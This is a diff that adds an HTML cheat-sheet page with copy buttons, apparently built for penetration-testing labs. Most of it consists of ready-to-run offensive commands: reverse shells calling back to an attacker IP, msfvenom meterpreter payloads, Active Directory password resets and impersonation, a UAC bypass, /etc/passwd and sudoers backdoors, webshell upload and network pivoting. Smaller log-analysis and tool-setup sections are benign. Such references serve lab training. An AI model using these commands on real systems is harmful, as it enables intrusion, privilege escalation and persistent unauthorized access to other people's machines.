+      <div class="cmd" onclick="copyCmd(this)">bloodyAD --host <span class="var">{{DC}}</span> -d <span class="var">{{DOMAIN}}</span> -u <span class="var">{{USER}}</span> -p <span class="var">{{PASS}}</span> set password Administrator <span class="var">newpass</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">net rpc group addmem "<span class="var">{{GROUP}}</span>" "<span class="var">{{USER}}</span>" -U "<span class="var">{{DOMAIN}}</span>"/"<span class="var">{{ADMIN}}</span>"%'<span class="var">{{PASS}}</span>' -S <span class="var">{{IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-getST '<span class="var">{{DOMAIN}}</span>/<span class="var">{{USER}}</span>' -spn 'cifs/<span class="var">{{DC}}</span>' -impersonate target_user -dc-ip <span class="var">{{IP}}</span> -k -no-pass<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">RBCD / S4U2Self impersonation</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ SHELL / PAYLOAD ═══════════════ -->
+<div class="section" data-cat="shell">
+  <div class="section-title">💀 SHELL & PAYLOAD</div>
+  <div class="cards-grid">
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">🐚</span> REVERSE SHELL</div>
+      <span class="tag exploit">EXPLOIT</span>
+      <div class="cmd" onclick="copyCmd(this)">rlwrap -cAr nc -nlvp <span class="var">{{PORT}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Listener (rlwrap = arrow keys support)</div>
+      <div class="cmd" onclick="copyCmd(this)">nc -lvnp <span class="var">{{PORT}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">/bin/bash -i &gt;&amp; /dev/tcp/<span class="var">{{KALI_IP}}</span>/<span class="var">{{PORT}}</span> 0&gt;&amp;1<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">python -c 'import pty; pty.spawn("/bin/bash")'<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">TTY upgrade</div>
+    </div>
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">🧬</span> MSFVENOM</div>
+      <span class="tag exploit">EXPLOIT</span>
+      <div class="cmd" onclick="copyCmd(this)">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="var">{{KALI_IP}}</span> LPORT=<span class="var">{{PORT}}</span> -f exe &gt; shell.exe<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="var">{{KALI_IP}}</span> LPORT=<span class="var">{{PORT}}</span> -f msi -o shell.msi<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="var">{{NGROK}}</span> LPORT=<span class="var">{{PORT}}</span> &gt; shell.php<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card red-top">
+      <div class="card-title"><span class="icon">🪟</span> WINDOWS SHELL</div>
+      <span class="tag exploit">EXPLOIT</span>
+      <div class="cmd" onclick="copyCmd(this)">PrintSpoofer64.exe -c "C:\Users\offsec\Downloads\nc.exe <span class="var">{{KALI_IP}}</span> <span class="var">{{PORT}}</span> -e cmd.exe"<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">run.exe <span class="var">{{USER}}</span> <span class="var">{{PASS}}</span> "nc.exe <span class="var">{{KALI_IP}}</span> <span class="var">{{PORT}}</span> -e cmd.exe" --bypass-uac<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">RunasCs + UAC bypass</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ PRIVESC ═══════════════ -->
+<div class="section" data-cat="privesc">
+  <div class="section-title">⬆ PRIVILEGE ESCALATION</div>
+  <div class="cards-grid">
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">🐧</span> LINUX PRIVESC</div>
+      <span class="tag privesc">PRIVESC</span>
+      <div class="cmd" onclick="copyCmd(this)">wget https://github.com/peass-ng/PEASS-ng/releases/download/20250518-5781f7e5/linpeas.sh<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">chmod +x linpeas.sh && ./linpeas.sh<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">sudo -l<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">find / -perm -4000 -type f 2&gt;/dev/null<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">SUID files</div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-smbserver share $(pwd) -smb2support<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Serve files via SMB (Windows target)</div>
+    </div>
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">🪟</span> WINDOWS PRIVESC</div>
+      <span class="tag privesc">PRIVESC</span>
+      <div class="cmd" onclick="copyCmd(this)">powershell iwr -Uri http://<span class="var">{{KALI_IP}}</span>/winPEASx64.exe -OutFile win.exe<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">.\win.exe<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">C:\Users\<span class="var">{{USER}}</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">PS History path (loot)</div>
+    </div>
+
+    <div class="card purple-top">
+      <div class="card-title"><span class="icon">🔒</span> UAC BYPASS (fodhelper)</div>
+      <span class="tag privesc">PRIVESC</span>
+      <div class="cmd" onclick="copyCmd(this)">reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe /c start cmd.exe" /f<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">start "" C:\Windows\System32\fodhelper.exe<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">reg delete HKCU\Software\Classes\ms-settings /f<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Cleanup after UAC bypass</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ PERSISTENCE ═══════════════ -->
+<div class="section" data-cat="persist">
+  <div class="section-title">🔧 PERSISTENCE</div>
+  <div class="cards-grid">
+
+    <div class="card yellow-top">
+      <div class="card-title"><span class="icon">👤</span> /etc/passwd INJECT</div>
+      <span class="tag persist">PERSIST</span>
+      <div class="cmd" onclick="copyCmd(this)">openssl passwd -1 '<span class="var">{{PASSWORD}}</span>'<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">echo '<span class="var">backdoor</span>:<span class="var">{{HASH}}</span>:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">UID 0 = root — requires write access on /etc/passwd</div>
+    </div>
+
+    <div class="card yellow-top">
+      <div class="card-title"><span class="icon">⏰</span> CRON / AUTO</div>
+      <span class="tag persist">PERSIST</span>
+      <div class="cmd" onclick="copyCmd(this)">auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name test<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">auto add --schedule "* * * * *" --command "echo '<span class="var">user</span> ALL=(ALL:ALL) NOPASSWD:ALL' &gt;&gt; /etc/sudoers" --name test2<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card yellow-top">
+      <div class="card-title"><span class="icon">📋</span> PERSIST TABLE</div>
+      <span class="tag persist">PERSIST</span>
+      <div style="font-family:'Share Tech Mono',monospace; font-size:0.72rem; color:var(--text); line-height:2;">
+        <div style="display:grid; grid-template-columns:1fr 1.5fr; gap:0.3rem 1rem; color:var(--text-dim);">
+          <span style="color:var(--accent3)">METHOD</span><span style="color:var(--accent3)">LOCATION</span>
+          <span>/etc/passwd inject</span><span>/etc/passwd (UID 0)</span>
+          <span>SSH backdoor</span><span>~/.ssh/authorized_keys</span>
+          <span>Cron job</span><span>/etc/cron.d/ | crontab -e</span>
+          <span>SUID bash</span><span>chmod u+s /bin/bash</span>
+          <span>Sudoers</span><span>/etc/sudoers.d/</span>
+          <span>Startup script</span><span>/etc/rc.local</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ PIVOT / TUNNEL ═══════════════ -->
+<div class="section" data-cat="pivot">
+  <div class="section-title">🌉 PIVOTING & TUNNELING</div>
+  <div class="cards-grid">
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🔗</span> LIGOLO-NG</div>
+      <span class="tag pivot">PIVOT</span>
+      <div class="cmd-note">— KALI SETUP —</div>
+      <div class="cmd" onclick="copyCmd(this)">sudo ip tuntap add user kali mode tun ligolo<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">sudo ip link set ligolo up<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">sudo ./proxy -selfcert<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">— TARGET —</div>
+      <div class="cmd" onclick="copyCmd(this)">iwr -Uri http://<span class="var">{{KALI_IP}}</span>/agent.exe -OutFile agent.exe<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">.\agent.exe -connect <span class="var">{{KALI_IP}}</span>:11601 -ignore-cert<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">— LIGOLO TERMINAL —</div>
+      <div class="cmd" onclick="copyCmd(this)">sudo ip route add <span class="var">{{TARGET_SUBNET}}</span>/24 dev ligolo<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🖥</span> REMOTE ACCESS</div>
+      <span class="tag pivot">PIVOT</span>
+      <div class="cmd" onclick="copyCmd(this)">xfreerdp3 /u:<span class="var">{{USER}}</span> /p:<span class="var">'{{PASS}}'</span> /v:<span class="var">{{IP}}</span> /cert:ignore<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">xfreerdp3 /u:<span class="var">{{USER}}</span> /p:<span class="var">'{{PASS}}'</span> /v:<span class="var">{{IP}}</span> /cert:ignore /drive:shared,/mnt/iso<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Mount local folder to RDP session</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ FILE TRANSFER ═══════════════ -->
+<div class="section" data-cat="transfer">
+  <div class="section-title">📦 FILE TRANSFER</div>
+  <div class="cards-grid">
+
+    <div class="card">
+      <div class="card-title"><span class="icon">⬇</span> DOWNLOAD TO TARGET</div>
+      <span class="tag pivot">TRANSFER</span>
+      <div class="cmd" onclick="copyCmd(this)">powershell iwr -Uri http://<span class="var">{{KALI_IP}}</span>/<span class="var">{{FILE}}</span> -OutFile <span class="var">{{FILE}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">python3 -m http.server 8080<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Serve files from Kali</div>
+      <div class="cmd" onclick="copyCmd(this)">impacket-smbserver share $(pwd) -smb2support<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">SMB share (Windows &gt; Linux transfer)</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">📤</span> SMB PUT (NXC)</div>
+      <span class="tag pivot">TRANSFER</span>
+      <div class="cmd" onclick="copyCmd(this)">nxc smb <span class="var">{{IP}}</span> -u '<span class="var">{{USER}}</span>' -p '<span class="var">{{PASS}}</span>' --put-file /usr/share/webshells/aspx/cmdasp.aspx Inetpub/wwwroot/cmd.aspx<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ LOG ANALYSIS ═══════════════ -->
+<div class="section" data-cat="log">
+  <div class="section-title">📊 LOG ANALYSIS</div>
+  <div class="cards-grid">
+
+    <div class="card">
+      <div class="card-title"><span class="icon">📋</span> AWK / GREP</div>
+      <span class="tag enum">LOG</span>
+      <div class="cmd" onclick="copyCmd(this)">awk '{print $9}' log.txt | sort | uniq -c | sort -nr | head -10<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Top HTTP status codes</div>
+      <div class="cmd" onclick="copyCmd(this)">grep -oP '\d+\.\d+\.\d+\.\d+' access.log | sort | uniq -c | sort -nr<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Top IPs</div>
+      <div class="cmd" onclick="copyCmd(this)">cat log.txt | grep 'failed login' | grep -v <span class="var">{{TRUSTED_IP}}</span><span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">awk '$9 != "200" && ($7 ~ /\.js/ || $7 ~ /\.css/) {print $0}' access.log<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">cat log.txt | column -t -s ":"<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Format colon-separated log</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════ TOOLS SETUP ═══════════════ -->
+<div class="section" data-cat="tool">
+  <div class="section-title">🛠 TOOLS SETUP</div>
+  <div class="cards-grid">
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🐳</span> SPLUNK (DOCKER)</div>
+      <span class="tag enum">SETUP</span>
+      <div class="cmd" onclick="copyCmd(this)">sudo systemctl start docker && sudo systemctl enable docker<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">docker pull splunk/splunk:latest<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">docker run -d --name splunk -p 8000:8000 -p 8088:8088 -p 8089:8089 -e SPLUNK_START_ARGS="--accept-license" -e SPLUNK_PASSWORD="P@ssw0rd" splunk/splunk:latest<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">docker start splunk<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">docker logs -f splunk<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">docker rm -f splunk<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🔴</span> MSF / NESSUS</div>
+      <span class="tag enum">SETUP</span>
+      <div class="cmd" onclick="copyCmd(this)">sudo msfdb reinit<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">msfconsole<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">systemctl start nessusd<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="icon">🩺</span> MISC KALI</div>
+      <span class="tag enum">SETUP</span>
+      <div class="cmd" onclick="copyCmd(this)">sed -i 's/\xe2\x80\x8b//g' exploit.py<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd-note">Remove zero-width spaces from copied exploit</div>
+      <div class="cmd" onclick="copyCmd(this)">sudo resize2fs /dev/sda1<span class="copied-badge">✓ copied</span></div>
+      <div class="cmd" onclick="copyCmd(this)">df -h<span class="copied-badge">✓ copied</span></div>
+    </div>
+
+  </div>
+</div>
+
+</main>
+
+<footer>
+  BurN1nGSPheRE // YARMTUK // HackTheBox | SECPlayground | OffSec PG — AUTHORIZED LAB USE ONLY
+</footer>
+
+<script>
+  let activeTab = 'all';
+
+  function copyCmd(el) {
+    const text = el.innerText.replace('✓ copied', '').trim();
+    navigator.clipboard.writeText(text).catch(() => {
+      const ta = document.createElement('textarea');
+      ta.value = text; document.body.appendChild(ta);
+      ta.select(); document.execCommand('copy');
+      document.body.removeChild(ta);
+    });
+    el.classList.add('copied');
+    setTimeout(() => el.classList.remove('copied'), 1500);
+  }
+
+  function filterTab(cat) {
+    activeTab = cat;
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    event.target.classList.add('active');
+    applyFilters();
+  }
+
+  function filterAll() { applyFilters(); }
+
+  function applyFilters() {
+    const q = document.getElementById('searchInput').value.toLowerCase();
+    let visible = 0;
+
+    document.querySelectorAll('.section').forEach(sec => {
+      const cat = sec.dataset.cat;
+      const tabMatch = activeTab === 'all' || cat === activeTab;
+
+      if (!tabMatch) { sec.classList.add('hidden'); return; }
+
+      let secVisible = 0;
+      sec.querySelectorAll('.card').forEach(card => {
+        if (!q) { card.classList.remove('hidden'); secVisible++; return; }
+        const txt = card.innerText.toLowerCase();
+        if (txt.includes(q)) { card.classList.remove('hidden'); secVisible++; }
+        else card.classList.add('hidden');
+      });
+
+      if (secVisible === 0 && q) sec.classList.add('hidden');
+      else { sec.classList.remove('hidden'); visible += secVisible; }
+    });
+
+    const total = document.querySelectorAll('.card:not(.hidden)').length;
+    document.getElementById('counter').textContent = q
+      ? `[ ${total} COMMANDS FOUND ]`
+      : `[ ${document.querySelectorAll('.card').length} TOTAL COMMANDS ]`;
+  }
+
+  // Init counter
+  window.addEventListener('load', () => {
+    document.getElementById('counter').textContent =
+      `[ ${document.querySelectorAll('.card').length} TOTAL COMMANDS ]`;
+  });
+
+  // Register service worker for offline / PWA support
+  if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+      navigator.serviceWorker.register('sw.js').catch(() => {});
+    });
+  }
+</script>
+</div><!-- /#app-wrap -->
+</body>
+</html>
